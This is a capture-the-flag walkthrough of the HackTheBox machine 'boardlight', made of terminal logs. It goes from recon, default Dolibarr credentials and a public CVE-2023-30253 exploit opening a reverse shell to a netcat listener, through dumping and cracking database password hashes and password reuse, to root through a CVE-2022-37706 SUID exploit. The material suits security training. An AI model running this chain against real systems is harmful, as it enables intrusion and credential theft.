boardlight.htb

10.10.11.11

RECON

PORT Scanning

sed@pop-os:~$  rustscan -a 10.10.11.11 --ulimit 5000 -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
Open 10.10.11.11:22
Open 10.10.11.11:80
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

whatweb scan 
sed@pop-os:~$ whatweb 10.10.11.11
http://10.10.11.11 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@board.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.11], JQuery[3.4.1], Script[text/javascript], X-UA-Compatible[IE=edge]

add board.htb to hosts

found nothing on dirsearch

enumerating subdomains

sed@pop-os:~$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u "http://board.htb" -H "Host:FUZZ.board.htb" -mc 200,301 -t 100 -fl 518

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,301
 :: Filter           : Response lines: 518
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150]
:: Progress: [4727/4727] :: Job [1/1] :: 1181 req/sec :: Duration: [0:00:04] :: Errors: 0 ::

adding it to hosts

since its an easy machine trying some default passwords from google for dolibarr crm 

admin:admin works but it has limited control


found a CVE on github that grants a reverse shell 
https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

Cloning and running the exploit
sed@pop-os:~/sed/board.htb$ python3 exploit.py http://crm.board.htb admin admin 10.10.16.47 6969
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
[!] If you have not received the shell, please check your login and password

Got a reverse shell 
sed@pop-os:~/sed/board.htb$ nc -lnvp 6969
Listening on 0.0.0.0 6969
Connection received on 10.10.11.11 38908
bash: cannot set terminal process group (855): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ 

running linpeas inside the machine to find vuln spots
Found port 3306 i.e. this has mysql installed

╔══════════╣ MySQL version
mysql  Ver 8.0.36-0ubuntu0.20.04.1 for Linux on x86_64 ((Ubuntu))


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No
═╣ MySQL connection using root/NOPASS ................. No

Found some cheezy files

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 www-data www-data 31 Mar  4  2023 /var/www/html/crm.board.htb/htdocs/conf/.htaccess
-rw-rw-rw- 1 www-data www-data 31 May 13 13:20 /var/www/html/crm.board.htb/documents/.htaccess

cd  /var/www/html/crm.board.htb/htdocs/conf/

boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
cat conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings

Found MYSQL config 
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_name='dolibarr';

mysql -D dolibarr -u dolibarrowner -p
Enter password: serverfun2$2023!!

use dolibarr;
show tables;

Found USER table

llx_tva
llx_user <-
llx_user_alert



mysql> select * from llx_user;
select * from llx_user;
 gives a large unreadable output 
 lets filter 
 
 
mysql> select login, pass, pass_crypted from llx_user;
select login, pass, pass_crypted from llx_user;
+----------+------+--------------------------------------------------------------+
| login    | pass | pass_crypted                                                 |
+----------+------+--------------------------------------------------------------+
| dolibarr | NULL | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm |
| admin    | NULL | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 |
+----------+------+--------------------------------------------------------------+
2 rows in set (0.00 sec)

hashcatting the crypts

sed@pop-os:~/sed/board.htb$ hashcat -a 0 -m 3200 hash.txt /usr/share/seclists/rockyou.txt -w 3 -O -d 1
hashcat (v6.2.5) starting
OpenCL API (OpenCL 3.0 CUDA 12.4.125) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #1: NVIDIA GeForce RTX 3060 Laptop GPU, 5760/5930 MB (1482 MB allocatable), 30MCU

$2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96:admin
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlU...hhjH96
Time.Started.....: Tue Jun 11 00:26:42 2024 (25 secs)
Time.Estimated...: Tue Jun 11 00:27:07 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      874 H/s (50.32ms) @ Accel:128 Loops:32 Thr:11 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 21120/14344384 (0.15%)
Rejected.........: 0/21120 (0.00%)
Restore.Point....: 19712/14344384 (0.14%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#1....: lollollol -> cherry14
Hardware.Mon.#1..: Temp: 53c Util:100% Core:1995MHz Mem:7000MHz Bus:16

Started: Tue Jun 11 00:26:37 2024
Stopped: Tue Jun 11 00:27:08 2024

No use 
lets try using serverfun2$2023!! for the user larissa

we're in
www-data@boardlight:/home$ su larissa
su larissa
Password: serverfun2$2023!!

larissa@boardlight:/home$ 

Found user flag larissa@boardlight:~$ cat user.txt
cat user.txt
4f690fdf558c55b030fb80b3239aa72e

Running linpeas to find an exploit 

no clue

larissa@boardlight:~$ find / -user root -perm /4000 2>/dev/null
find / -user root -perm /4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper

found an exploit 
https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit

Documents  exp.sh     Music       Public    user.txt
larissa@boardlight:~$ ./exp.sh
./exp.sh
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
83520f9eac98908e4734c943a699e61d
# 





